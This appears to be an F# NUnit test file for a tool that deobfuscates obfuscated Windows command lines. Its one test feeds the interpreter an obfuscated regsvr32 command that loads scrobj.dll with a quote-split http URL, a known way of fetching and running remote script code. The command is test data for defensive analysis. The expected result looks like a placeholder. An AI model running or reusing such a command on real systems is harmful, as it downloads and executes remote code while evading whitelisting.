namespace Deobfuscator.Tests.DOSfuscation

open System
open NUnit.Framework
open Deobfuscator
open Deobfuscator.DomainTypes
open Deobfuscator.Interpreter
open NUnit.Framework

[<TestFixture>]
type TestClass () =

    let vars   = Map.empty.Add("COMSPEC", "C:\\Windows\\System32\\cmd.exe")
    let cmdctx = {
        EnvVars = vars
        StdOut = String.Empty
        StdIn  = String.Empty
        InputCmd = String.Empty
        Log = []
    }

    [<Test>]
    member this.IntroRegSvrEx() =
        let input    = "regsvr32.exe /s /n /u /i:\"h\"t\"t\"p://github.com/a.jpg scrobj.dll"
        let expected = ["abc"]

        match evaluate {cmdctx with InputCmd = input} with
        | Ok (_, resctx) ->
            printfn "========================"
            printfn "Expected > %A" expected
            printfn "Actual   > %A" resctx
            Assert.That(resctx.Log, Is.EqualTo(expected))
            printfn "========================"

        | Error reason ->
            Assert.Fail(sprintf "Test Failed: %A" reason)